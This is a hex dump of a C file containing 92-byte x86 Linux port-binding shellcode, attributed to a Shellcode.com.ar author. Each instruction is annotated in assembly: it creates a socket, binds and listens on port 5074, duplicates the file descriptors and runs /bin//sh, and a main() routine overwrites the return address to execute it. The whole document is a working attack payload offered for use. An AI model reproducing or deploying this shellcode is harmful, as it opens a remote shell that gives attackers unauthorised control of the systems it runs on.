00000000  2f 2a 20 0d 0a 20 2a 20  73 30 74 34 69 70 76 36  |/* .. * s0t4ipv6|
00000010  40 53 68 65 6c 6c 63 6f  64 65 2e 63 6f 6d 2e 61  |@Shellcode.com.a|
00000020  72 0d 0a 20 2a 20 78 38  36 20 70 6f 72 74 62 69  |r.. * x86 portbi|
00000030  6e 64 20 61 20 73 68 65  6c 6c 20 69 6e 20 70 6f  |nd a shell in po|
00000040  72 74 20 35 30 37 34 0d  0a 20 2a 20 39 32 20 62  |rt 5074.. * 92 b|
00000050  79 74 65 73 2e 0d 0a 20  2a 0d 0a 20 2a 2f 0d 0a  |ytes... *.. */..|
00000060  0d 0a 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |..char shellcode|
00000070  5b 5d 20 3d 0d 0a 22 5c  78 33 31 5c 78 63 30 22  |[] =.."\x31\xc0"|
00000080  09 09 09 2f 2f 20 78 6f  72 6c 09 09 25 65 61 78  |...// xorl..%eax|
00000090  2c 25 65 61 78 0d 0a 22  5c 78 35 30 22 09 09 09  |,%eax.."\x50"...|
000000a0  09 2f 2f 20 70 75 73 68  6c 09 25 65 61 78 0d 0a  |.// pushl.%eax..|
000000b0  22 5c 78 34 30 22 09 09  09 09 2f 2f 20 69 6e 63  |"\x40"....// inc|
000000c0  6c 09 09 25 65 61 78 0d  0a 22 5c 78 38 39 5c 78  |l..%eax.."\x89\x|
000000d0  63 33 22 09 09 09 2f 2f  20 6d 6f 76 6c 09 09 25  |c3"...// movl..%|
000000e0  65 61 78 2c 25 65 62 78  0d 0a 22 5c 78 35 30 22  |eax,%ebx.."\x50"|
000000f0  09 09 09 09 2f 2f 20 70  75 73 68 6c 09 25 65 61  |....// pushl.%ea|
00000100  78 0d 0a 22 5c 78 34 30  22 09 09 09 09 2f 2f 20  |x.."\x40"....// |
00000110  69 6e 63 6c 09 09 25 65  61 78 0d 0a 22 5c 78 35  |incl..%eax.."\x5|
00000120  30 22 09 09 09 09 2f 2f  20 70 75 73 68 6c 09 25  |0"....// pushl.%|
00000130  65 61 78 0d 0a 22 5c 78  38 39 5c 78 65 31 22 09  |eax.."\x89\xe1".|
00000140  09 09 2f 2f 20 6d 6f 76  6c 09 09 25 65 73 70 2c  |..// movl..%esp,|
00000150  25 65 63 78 0d 0a 22 5c  78 62 30 5c 78 36 36 22  |%ecx.."\xb0\x66"|
00000160  09 09 09 2f 2f 20 6d 6f  76 62 09 09 24 30 78 36  |...// movb..$0x6|
00000170  36 2c 25 61 6c 0d 0a 22  5c 78 63 64 5c 78 38 30  |6,%al.."\xcd\x80|
00000180  22 09 09 09 2f 2f 20 69  6e 74 09 09 24 30 78 38  |"...// int..$0x8|
00000190  30 0d 0a 22 5c 78 33 31  5c 78 64 32 22 09 09 09  |0.."\x31\xd2"...|
000001a0  2f 2f 20 78 6f 72 6c 09  09 25 65 64 78 2c 25 65  |// xorl..%edx,%e|
000001b0  64 78 0d 0a 22 5c 78 35  32 22 09 09 09 09 2f 2f  |dx.."\x52"....//|
000001c0  20 70 75 73 68 6c 09 25  65 64 78 0d 0a 22 5c 78  | pushl.%edx.."\x|
000001d0  36 36 5c 78 36 38 5c 78  31 33 5c 78 64 32 22 09  |66\x68\x13\xd2".|
000001e0  09 2f 2f 20 70 75 73 68  77 09 24 30 78 64 32 31  |.// pushw.$0xd21|
000001f0  33 0d 0a 22 5c 78 34 33  22 09 09 09 09 2f 2f 20  |3.."\x43"....// |
00000200  69 6e 63 6c 09 09 25 65  62 78 0d 0a 22 5c 78 36  |incl..%ebx.."\x6|
00000210  36 5c 78 35 33 22 09 09  09 2f 2f 20 70 75 73 68  |6\x53"...// push|
00000220  77 09 25 62 78 0d 0a 22  5c 78 38 39 5c 78 65 31  |w.%bx.."\x89\xe1|
00000230  22 09 09 09 2f 2f 20 6d  6f 76 6c 09 09 25 65 73  |"...// movl..%es|
00000240  70 2c 25 65 63 78 0d 0a  22 5c 78 36 61 5c 78 31  |p,%ecx.."\x6a\x1|
00000250  30 22 09 09 09 2f 2f 20  70 75 73 68 6c 09 24 30  |0"...// pushl.$0|
00000260  78 31 30 0d 0a 22 5c 78  35 31 22 09 09 09 09 2f  |x10.."\x51"..../|
00000270  2f 20 70 75 73 68 6c 09  25 65 63 78 0d 0a 22 5c  |/ pushl.%ecx.."\|
00000280  78 35 30 22 09 09 09 09  2f 2f 20 70 75 73 68 6c  |x50"....// pushl|
00000290  09 25 65 61 78 0d 0a 22  5c 78 38 39 5c 78 65 31  |.%eax.."\x89\xe1|
000002a0  22 09 09 09 2f 2f 20 6d  6f 76 6c 09 09 25 65 73  |"...// movl..%es|
000002b0  70 2c 25 65 63 78 0d 0a  22 5c 78 62 30 5c 78 36  |p,%ecx.."\xb0\x6|
000002c0  36 22 09 09 09 2f 2f 20  6d 6f 76 62 09 09 24 30  |6"...// movb..$0|
000002d0  78 36 36 2c 25 61 6c 0d  0a 22 5c 78 63 64 5c 78  |x66,%al.."\xcd\x|
000002e0  38 30 22 09 09 09 2f 2f  20 69 6e 74 09 09 24 30  |80"...// int..$0|
000002f0  78 38 30 0d 0a 22 5c 78  34 30 22 09 09 09 09 2f  |x80.."\x40"..../|
00000300  2f 20 69 6e 63 6c 09 09  25 65 61 78 0d 0a 22 5c  |/ incl..%eax.."\|
00000310  78 38 39 5c 78 34 34 5c  78 32 34 5c 78 30 34 22  |x89\x44\x24\x04"|
00000320  09 09 2f 2f 20 6d 6f 76  6c 09 09 25 65 61 78 2c  |..// movl..%eax,|
00000330  30 78 34 28 25 65 73 70  2c 31 29 0d 0a 22 5c 78  |0x4(%esp,1).."\x|
00000340  34 33 22 09 09 09 09 2f  2f 20 69 6e 63 6c 09 09  |43"....// incl..|
00000350  25 65 62 78 0d 0a 22 5c  78 34 33 22 09 09 09 09  |%ebx.."\x43"....|
00000360  2f 2f 20 69 6e 63 6c 09  09 25 65 62 78 0d 0a 22  |// incl..%ebx.."|
00000370  5c 78 62 30 5c 78 36 36  22 09 09 09 2f 2f 20 6d  |\xb0\x66"...// m|
00000380  6f 76 62 09 09 24 30 78  36 36 2c 25 61 6c 0d 0a  |ovb..$0x66,%al..|
00000390  22 5c 78 63 64 5c 78 38  30 22 09 09 09 2f 2f 20  |"\xcd\x80"...// |
000003a0  69 6e 74 09 09 24 30 78  38 30 0d 0a 22 5c 78 38  |int..$0x80.."\x8|
000003b0  33 5c 78 63 34 5c 78 30  63 22 09 09 09 2f 2f 20  |3\xc4\x0c"...// |
000003c0  61 64 64 6c 09 09 24 30  78 63 2c 25 65 73 70 0d  |addl..$0xc,%esp.|
000003d0  0a 22 5c 78 35 32 22 09  09 09 09 2f 2f 20 70 75  |."\x52"....// pu|
000003e0  73 68 6c 09 25 65 64 78  0d 0a 22 5c 78 35 32 22  |shl.%edx.."\x52"|
000003f0  09 09 09 09 2f 2f 20 70  75 73 68 6c 09 25 65 64  |....// pushl.%ed|
00000400  78 0d 0a 22 5c 78 34 33  22 09 09 09 09 2f 2f 20  |x.."\x43"....// |
00000410  69 6e 63 6c 09 09 25 65  62 78 0d 0a 22 5c 78 62  |incl..%ebx.."\xb|
00000420  30 5c 78 36 36 22 09 09  09 2f 2f 20 6d 6f 76 62  |0\x66"...// movb|
00000430  09 09 24 30 78 36 36 2c  25 61 6c 0d 0a 22 5c 78  |..$0x66,%al.."\x|
00000440  63 64 5c 78 38 30 22 09  09 09 2f 2f 20 69 6e 74  |cd\x80"...// int|
00000450  09 09 24 30 78 38 30 0d  0a 22 5c 78 39 33 22 09  |..$0x80.."\x93".|
00000460  09 09 09 2f 2f 20 78 63  68 67 6c 09 25 65 61 78  |...// xchgl.%eax|
00000470  2c 25 65 62 78 0d 0a 22  5c 78 38 39 5c 78 64 31  |,%ebx.."\x89\xd1|
00000480  22 09 09 09 2f 2f 20 6d  6f 76 6c 09 09 25 65 64  |"...// movl..%ed|
00000490  78 2c 25 65 63 78 0d 0a  22 5c 78 62 30 5c 78 33  |x,%ecx.."\xb0\x3|
000004a0  66 22 09 09 09 2f 2f 20  6d 6f 76 62 09 09 24 30  |f"...// movb..$0|
000004b0  78 33 66 2c 25 61 6c 0d  0a 22 5c 78 63 64 5c 78  |x3f,%al.."\xcd\x|
000004c0  38 30 22 09 09 09 2f 2f  20 69 6e 74 09 09 24 30  |80"...// int..$0|
000004d0  78 38 30 0d 0a 22 5c 78  34 31 22 09 09 09 09 2f  |x80.."\x41"..../|
000004e0  2f 20 69 6e 63 6c 09 09  25 65 63 78 0d 0a 22 5c  |/ incl..%ecx.."\|
000004f0  78 38 30 5c 78 66 39 5c  78 30 33 22 09 09 09 2f  |x80\xf9\x03".../|
00000500  2f 20 63 6d 70 62 09 09  24 30 78 33 2c 25 63 6c  |/ cmpb..$0x3,%cl|
00000510  0d 0a 22 5c 78 37 35 5c  78 66 36 22 09 09 09 2f  |.."\x75\xf6".../|
00000520  2f 20 6a 6e 7a 09 09 3c  73 68 65 6c 6c 63 6f 64  |/ jnz..<shellcod|
00000530  65 2b 30 78 34 30 3e 0d  0a 22 5c 78 35 32 22 09  |e+0x40>.."\x52".|
00000540  09 09 09 2f 2f 20 70 75  73 68 6c 09 25 65 64 78  |...// pushl.%edx|
00000550  0d 0a 22 5c 78 36 38 5c  78 36 65 5c 78 32 66 5c  |.."\x68\x6e\x2f\|
00000560  78 37 33 5c 78 36 38 22  09 09 2f 2f 20 70 75 73  |x73\x68"..// pus|
00000570  68 6c 09 24 30 78 36 38  37 33 32 66 36 65 0d 0a  |hl.$0x68732f6e..|
00000580  22 5c 78 36 38 5c 78 32  66 5c 78 32 66 5c 78 36  |"\x68\x2f\x2f\x6|
00000590  32 5c 78 36 39 22 09 09  2f 2f 20 70 75 73 68 6c  |2\x69"..// pushl|
000005a0  09 24 30 78 36 39 36 32  32 66 32 66 0d 0a 22 5c  |.$0x69622f2f.."\|
000005b0  78 38 39 5c 78 65 33 22  09 09 09 2f 2f 20 6d 6f  |x89\xe3"...// mo|
000005c0  76 6c 09 09 25 65 73 70  2c 25 65 62 78 0d 0a 22  |vl..%esp,%ebx.."|
000005d0  5c 78 35 32 22 09 09 09  09 2f 2f 20 70 75 73 68  |\x52"....// push|
000005e0  6c 09 25 65 64 78 0d 0a  22 5c 78 35 33 22 09 09  |l.%edx.."\x53"..|
000005f0  09 09 2f 2f 20 70 75 73  68 6c 09 25 65 62 78 0d  |..// pushl.%ebx.|
00000600  0a 22 5c 78 38 39 5c 78  65 31 22 09 09 09 2f 2f  |."\x89\xe1"...//|
00000610  20 6d 6f 76 6c 09 09 25  65 73 70 2c 25 65 63 78  | movl..%esp,%ecx|
00000620  0d 0a 22 5c 78 62 30 5c  78 30 62 22 09 09 09 2f  |.."\xb0\x0b".../|
00000630  2f 20 6d 6f 76 62 09 09  24 30 78 62 2c 25 61 6c  |/ movb..$0xb,%al|
00000640  0d 0a 22 5c 78 63 64 5c  78 38 30 22 09 09 09 2f  |.."\xcd\x80".../|
00000650  2f 20 69 6e 74 09 09 24  30 78 38 30 0d 0a 3b 0d  |/ int..$0x80..;.|
00000660  0a 0d 0a 6d 61 69 6e 28  29 20 7b 0d 0a 20 20 20  |...main() {..   |
00000670  20 20 20 20 20 69 6e 74  20 2a 72 65 74 3b 0d 0a  |     int *ret;..|
00000680  20 20 20 20 20 20 20 20  72 65 74 3d 28 69 6e 74  |        ret=(int|
00000690  20 2a 29 26 72 65 74 20  2b 32 3b 0d 0a 20 20 20  | *)&ret +2;..   |
000006a0  20 20 20 20 20 70 72 69  6e 74 66 28 22 53 68 65  |     printf("She|
000006b0  6c 6c 63 6f 64 65 20 6c  65 6e 67 68 74 3d 25 64  |llcode lenght=%d|
000006c0  5c 6e 22 2c 73 74 72 6c  65 6e 28 73 68 65 6c 6c  |\n",strlen(shell|
000006d0  63 6f 64 65 29 29 3b 0d  0a 20 20 20 20 20 20 20  |code));..       |
000006e0  20 28 2a 72 65 74 29 20  3d 20 28 69 6e 74 29 73  | (*ret) = (int)s|
000006f0  68 65 6c 6c 63 6f 64 65  3b 0d 0a 7d              |hellcode;..}|
000006fc
